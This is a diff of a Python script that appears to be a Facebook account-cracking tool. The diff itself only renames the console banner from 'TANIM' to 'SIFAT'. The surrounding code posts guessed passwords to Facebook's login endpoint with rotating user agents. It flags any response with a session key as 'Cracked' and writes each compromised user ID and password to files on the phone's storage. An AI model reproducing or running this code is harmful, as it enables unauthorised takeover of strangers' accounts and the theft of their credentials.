@@ -742,7 +742,7 @@ def login1(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mTANIM\33[38;5;37m-\x1b[38;5;46mS1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\33[38;5;37m-\x1b[38;5;46mS1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
@@ -803,7 +803,7 @@ def login2(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mTANIM\33[38;5;37m-\x1b[38;5;46mS2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\33[38;5;37m-\x1b[38;5;46mS2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
@@ -848,7 +848,7 @@ def login2(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTANIM\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/SIFAT-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
@@ -909,7 +909,7 @@ def login3(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTANIM\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/SIFAT-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
